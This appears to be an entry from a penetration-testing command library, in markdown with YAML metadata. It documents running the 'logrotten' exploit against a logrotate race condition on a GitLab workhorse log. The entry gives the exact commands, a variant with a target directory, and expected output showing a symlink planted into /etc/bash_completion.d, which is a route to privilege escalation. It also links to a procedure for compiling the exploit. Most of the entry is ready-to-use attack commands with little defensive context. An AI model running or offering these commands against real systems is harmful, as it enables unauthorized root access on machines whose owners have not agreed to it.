---
data: ./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log
tags:
  - exploit
  - race
type: command
output: >-
  Waiting for rotating... Renamed ... and created symlink to
  /etc/bash_completion.d Done!
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:56.974Z'
id: 3f517e12-bb9e-4d3e-9546-eee04cb64fc1
verified: false
validated: true
submitted: true
---
# logrotten-execute

## Command

```bash
./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log
```

## Description

Runs the logrotten tool to monitor and exploit the logrotate race by renaming the directory and creating a symlink during the rotation window.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -c | Target log file path | Yes |
| /path/to/log | Specific log to monitor | Yes |

## Examples

### Basic Usage

```bash
./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log
```

### Advanced Usage

```bash
./logrotten -c /path/to/other.log -t /target/dir
```

## Expected Output

'Waiting for rotating... Renamed directory and created symlink... Done!'

## Related

- [[commands/echo-create-dummy-log]]
- [[procedures/Compile-and-Execute-Logrotten-Exploit]]
